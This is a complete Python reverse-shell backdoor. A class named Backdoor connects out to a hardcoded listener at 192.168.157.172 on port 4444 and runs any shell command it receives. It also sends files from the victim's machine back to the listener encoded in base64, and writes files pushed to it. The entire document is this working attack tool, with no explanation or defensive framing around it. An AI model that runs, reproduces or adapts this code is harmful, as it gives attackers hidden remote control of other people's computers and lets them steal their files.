import socket, subprocess, json, os, base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_sys_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data.decode("utf8", "replace"))
        self.connection.send(json_data.encode())
        return

    def reliable_rcv(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_dir(self, path):
        os.chdir(path)
        return (f"[+] Changing dir to {path}").encode()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download Successful"

    def run(self):
        while True:
            command = self.reliable_rcv()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    path = command[1]
                    command_result = self.change_dir(path)
                elif command[0] == "download":
                    path = command[1]
                    command_result = self.read_file(path)
                elif command[0] == "upload":
                    path = command[1]
                    write = self.write_file(path, command[2])
                    print(write)
                    command_result = '[+] Uploaded successfully'.encode()
                else:
                    command_result = self.execute_sys_command(command)
            except Exception as err:
                print(err)
                command_result = "[+] Error while running code".encode()

            self.reliable_send(command_result)

    def close(self):
        self.connection.close()


backdoor = Backdoor("192.168.157.172", 4444)
backdoor.run()
